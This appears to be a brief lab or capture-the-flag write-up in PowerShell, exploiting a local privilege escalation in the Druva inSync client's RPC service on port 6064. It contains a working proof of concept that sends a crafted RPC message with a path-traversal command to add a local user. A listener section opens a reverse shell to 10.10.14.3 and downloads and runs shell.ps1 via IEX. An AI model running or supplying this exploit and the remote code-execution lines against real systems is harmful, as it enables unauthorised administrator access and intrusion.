# Enumerating Installed Programs
```powershell
wmic product get name
```

# Enumerating Local Ports
```powershell
netstat -ano | findstr 6064

get-process -Id 3324
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64

get-service | ? {$_.DisplayName -like '*inSync*'}
```

# Automate
```powershell
Get-NetTCPConnection | ForEach-Object {
    $procName = $null
    # PID vasitəsilə prosesin adını təhlükəsiz şəkildə öyrənirik (bağlanmış proseslərdə xəta verməməsi üçün)
    if ($_.OwningProcess -and (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue)) {
        $procName = (Get-Process -Id $_.OwningProcess).ProcessName
    } else {
        $procName = "Unknown / Closed"
    }

    # Çıxış formatını nizamlayırıq
    [PSCustomObject]@{
        "Local Address"   = "$($_.LocalAddress):$($_.LocalPort)"
        "External Address"  = "$($_.RemoteAddress):$($_.RemotePort)"
        "Status"        = $_.State
        "PID"           = $_.OwningProcess
        "Process Name"    = $procName
    }
} | Format-Table -AutoSize
```

# Proof of Concept
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

# Listener
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

python3 -m http.server 8080
```
